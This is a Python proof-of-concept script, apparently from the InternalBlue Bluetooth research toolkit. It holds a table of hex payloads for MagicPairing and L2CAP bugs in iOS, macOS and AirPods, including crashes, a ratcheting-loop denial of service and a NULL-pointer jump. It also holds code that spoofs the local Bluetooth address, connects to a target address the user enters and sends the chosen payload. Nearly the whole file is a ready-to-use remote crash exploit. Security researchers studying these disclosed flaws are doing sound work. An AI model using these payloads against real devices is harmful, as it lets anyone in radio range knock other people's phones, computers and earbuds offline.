import binascii
import sys
import time

import InternalBlueL2CAP
from BTConnection import BluetoothConnection
from pwnlib import log
from pwnlib.ui import options

from internalblue.ioscore import iOSCore

VULNS = [{
    "description": "[MP1]: iOS RatchetAESSIV Crash (0xa8)",
    "tech": 0,
    "payload": "02010280003600AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
               "AAAAAAAAAAA001040012345678",
    "cid": 0x30,
    "mtu": True
}, {
    "description": "[MP2]: iOS Hint Crash (0x1)",
    "tech": 0,
    "payload": "01020304050607",
    "cid": 0x30,
    "mtu": False
}, {
    "description": "[MP3]: macOS RatchetAESSIV Crash (0x0)",
    "tech": 0,
    "payload": "02010280003600AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
               "AAAAAAAAAAA001040012345678",
    "cid": 0x30,
    "mtu": True
}, {
    "description": "[MP4]: macOS Hint Crash (0x0)",
    "tech": 0,
    "payload": "01010310001000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA20001000BB" +
               "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB0001040012345678",
    "cid": 0x30,
    "mtu": True
}, {
    "description": "[MP5]: iOS RatchetAESSIV Crash (0x10d)",
    "tech": 0,
    "payload": "02010b028000360091b51d14747835f3a0818f7de4434329b3d4e265" +
               "e5005b3f3ad5fdcaea6991b51d147478307de4434329b3d4e265e500" +
               "5b3f3ad5fdcaea6991b51d147478343239343936373239357de44343" +
               "29b3d4e265e5005b3f3ad5fdcaea6991a5580267a9a761bf4b046cf3" +
               "0e4f6147a1a06bb74b5702d6c0333430323832333636393230393338" +
               "343633343633333734363037343331373638f3a081b4323131343831" +
               "6c010104002b0100",
    "cid": 0x30,
    "mtu": True
}, {
    "description": "[MP6]: iOS RatchetAESSIV Assertion Failure Crash",
    "tech": 0,
    "payload": "02f3a081ae80002d330091b51d147478360104002b010000a393d231" +
               "31fe617878f69af4207d34323934393637333033e22775642f7fc1cd" +
               "9fdcddc89934dd39608afc6948b87ee0ef8968286341fd0515f98acd" +
               "5fb62f55f923887021a4ea8730cbaae05058b60f673c510a6170aa2e" +
               "cbdf1d142f763ef03f38d27c392ecdf1a574fdf906bcf74aa35da085" +
               "f137ddecff2aec0d5c95b8fa83a71b42af205359e4f02aaca2ab4778" +
               "001274a8183334303238323336363932303933383436333436333337" +
               "34363037343331373638323131343536057f",
    "cid": 0x30,
    "mtu": True
}, {
    "description": "[MP7]: macOS Ratcheting Loop DoS",
    "tech": 0,
    "payload": "02010280003600AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
               "AAAAAAAAAA00010400fffffff0",
    "cid": 0x30,
    "mtu": True,
    "addr_change": True
}, {
    "description": "[MP8]: MagicPairing Lockout - NOT IMPLEMENTED HERE"
}, {
    "description": "[L2CAP1]: AirPods L2CAP Crash",
    "tech": 0,
    "payload": "",
    "cid": 0x30,
    "mtu": False,
}, {
    "description": "[L2CAP2]: Group Reception Handler NULL-Pointer Jump (Classic Version)",
    "tech": 0,
    "payload": "000001000200",
    "cid": 0x02,
    "mtu": False,
}, {
    "description": "[L2CAP2]: Group Reception Handler NULL-Pointer Jump (BLE Version)",
    "tech": 1,
    "payload": "000001000200",
    "cid": 0x02,
    "mtu": False,
}
]


def listener(data):
    log.info("Listener received: %s", binascii.hexlify(data))


def bd_addr_to_bytes(addr_string):
    addr = addr_string.replace(":", "")
    return bytes.fromhex(addr)


def main():
    internalblue = iOSCore()

    # let user choose device if more than one is connected
    devices = internalblue.device_list()
    if len(devices) > 1:
        i = options("Please specify device: ", [d[2] for d in devices], 0)
        internalblue.interface = internalblue.device_list()[i][1]
    else:
        internalblue.interface = internalblue.device_list()[0][1]

    # let use choose the vuln
    i = options("Please choose your vuln: ", [v["description"] for v in VULNS], 0)

    vuln = VULNS[i]

    if not internalblue.connect():
        log.critical("No connection to internalblue device.")
        sys.exit(-1)

    # if the vuln requires an address change, ask for the address
    if "addr_change" in vuln and vuln["addr_change"]:
        change_addr = input("This PoC requires the Bluetooth address to be changed, " +
                            "please provide it: ")
        change_addr = bd_addr_to_bytes(change_addr)
        internalblue.sendHciCommand(0xfc01, change_addr[::-1])

    # now we need the bd addr of the target
    target = bd_addr_to_bytes(input("Target Bluetooth address: "))

    # connect to the target
    connection = BluetoothConnection(internalblue, target, reconnect=0)
    l2cap = InternalBlueL2CAP.L2CAPManager(connection)

    # in case we need an answer for one of the PoCs we listen to the given CID
    if "listen_cid" in vuln:
        l2cap.registerCIDHandler(listener, vuln["listen_cid"])

    # set the Bluetooth technology [0->Classic, 1->BLE]
    connection.connection_type = vuln["tech"]
    connection.connect()

    # If the PoC includes larger messages we need to do the MagicPairing Ping trick to
    # increase the MTU. This could also be done by sending L2CAP Information Requests and
    # Responses but this would take longer.
    if vuln["mtu"]:
        log.info("Sending MagicPairing Ping to increase L2CAP MTU")
        l2cap.sendData(bytes.fromhex("F00000"), 0x30)

    desc = vuln["description"]
    log.info("Executing payload for %s", desc[:desc.find("]") + 1])
    if isinstance(vuln["payload"], list):
        for p in vuln["payload"]:
            l2cap.sendData(bytes.fromhex(p), vuln["cid"])
    else:
        log.info("Sending: { %s }", vuln["payload"])
        l2cap.sendData(bytes.fromhex(vuln["payload"]), vuln["cid"])

    time.sleep(1)


if __name__ == "__main__":
    main()
